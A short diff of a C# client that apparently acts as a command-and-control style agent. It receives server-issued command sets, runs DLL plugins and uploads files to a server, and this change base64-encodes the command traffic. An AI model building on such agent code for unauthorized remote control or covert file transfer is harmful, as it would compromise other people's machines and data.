@@ -155,7 +155,7 @@ namespace client
                 // parse body json into a object
                 // c# got mad when there was no class to pass this into
                 // i now realize i could have used a base class lol
-                CommandSet commandSet = System.Text.Json.JsonSerializer.Deserialize<CommandSet>(body);
+                CommandSet commandSet = System.Text.Json.JsonSerializer.Deserialize<CommandSet>(Base64DecodeString(body));
                 
                 // console log the command set for testing
                 //Console.WriteLine($"Command set recieved: {commandSet.commands}");
@@ -205,15 +205,13 @@ namespace client
                                 this.SendFileToServer(files[i], Path.GetFileName(files[i]));
                             }
                         }
-                        
-
                         string exit_message = dll_return["ExitMessage"];
                         return $"Plugin ran successfully: {exit_message}";
                     }else{
                         string exit_message = dll_return["ExitMessage"];
                         return $"Plugin failed to run: {exit_message}";
                     }
-                } catch {
+                } catch (Exception e){
                     continue;
                 }
             }
@@ -270,6 +268,11 @@ namespace client
         private string Base64EncodeString(string str){
             //takes a string and returns it in base64
             return Convert.ToBase64String(Encoding.ASCII.GetBytes(str));
+        }
+        private string Base64DecodeString(string str){
+            //takes a base64 string and returns it decoded
+            var b_base64 = Convert.FromBase64String(str);
+            return Encoding.UTF8.GetString(b_base64);
         }
 
         
